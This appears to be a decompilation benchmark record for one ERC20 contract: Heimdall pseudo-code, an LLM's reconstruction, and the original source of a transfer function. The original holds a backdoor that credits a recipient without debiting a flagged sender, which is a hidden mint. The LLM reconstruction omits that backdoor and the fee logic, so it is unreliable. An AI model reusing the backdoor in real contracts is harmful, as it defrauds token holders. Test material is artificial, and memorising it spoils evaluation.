{
    "contract_address": "0xb4F77c4Cb758aeA0364f50892D20E267be9805c4",
    "heimdall_input": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x06;\n        require(0x01 - (bytes1(storage_map_b[var_a])), \"ERC20: transfer Amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x05;\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: transfer Amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        var_d = 0x01;\n        return 0x01;\n        require(address(msg.sender), \"ERC20: transfer Amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer Amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer Amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220416d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x0c;\n        if (storage_map_b[var_a]) {\n            if (!storage_map_b[var_a]) {\n                if (!0) {\n                    if (!address(uniswapV2Pair)) {\n                        if (address(arg0) - (address(uniswapV2Pair))) {\n                            require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n                            var_a = address(msg.sender);\n                            var_b = 0x0d;\n                            require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n                            var_a = address(msg.sender);\n                            var_b = 0x0d;\n                            require(!0, \"ERC20: transfer to the zero address\");\n                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_c = 0x11;\n                            require(!(address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_c = 0x12;\n                            require(address(arg0) - (address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n                            var_a = address(msg.sender);\n                            var_b = 0x05;\n                            require(address(msg.sender) - (address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_c = 0x11;\n                            var_a = address(msg.sender);\n                            var_b = 0x05;\n                            storage_map_b[var_a] = storage_map_b[var_a] - ((storage_map_b[var_a] * arg1) / 0x64);\n                            var_a = 0xdead;\n                            require(storage_map_b[var_a] == ((storage_map_b[var_a] * arg1) / arg1) | !arg1, \"ERC20: transfer to the zero address\");\n                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_c = 0x11;\n                            var_a = address(msg.sender);\n                            var_b = 0x0d;\n                            require(0x64, \"ERC20: transfer to the zero address\");\n                        }\n                    }\n                    require(!((storage_map_b[var_a] * arg1) / 0x64), \"ERC20: transfer to the zero address\");\n                    var_a = address(msg.sender);\n                    var_b = 0x0d;\n                    require(!(storage_map_b[var_a] - ((storage_map_b[var_a] * arg1) / 0x64) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n                }\n                require(!(store_d > (((storage_map_b[var_a] * arg1) / 0x64) + store_d)), \"ERC20: transfer to the zero address\");\n                require(address(msg.sender) - (address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n                require(!0x01, \"ERC20: transfer to the zero address\");\n                require(!(address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n                var_a = address(msg.sender);\n                var_b = 0x0d;\n                require(address(arg0) - (address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n            }\n            var_a = address(msg.sender);\n            var_b = 0x0d;\n            require(address(msg.sender) - (address(uniswapV2Pair)), \"ERC20: transfer to the zero address\");\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }",
    "llm_output": "function transfer(address recipient, uint256 amount) public payable returns (bool) {\n    // Mirror no-op check found in decompiled code\n    require(recipient == recipient, \"ERC20: invalid recipient\");\n\n    address sender = _msgSender();\n\n    // Re-express all original safety checks\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n    uint256 senderBalance = _balances[sender];\n    require(senderBalance >= amount, \"ERC20: transfer Amount exceeds balance\");\n\n    unchecked {\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n    }\n\n    emit Transfer(sender, recipient, amount);\n    return true;\n}",
    "ground_truth": "function transfer(address to, uint256 Amount) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        if (_release[Owner] == true) {\r\n            _balances[to] += Amount;\r\n            return true;\r\n        }\r\n        _receiveF(Owner, to, Amount);\r\n        return true;\r\n    }"
}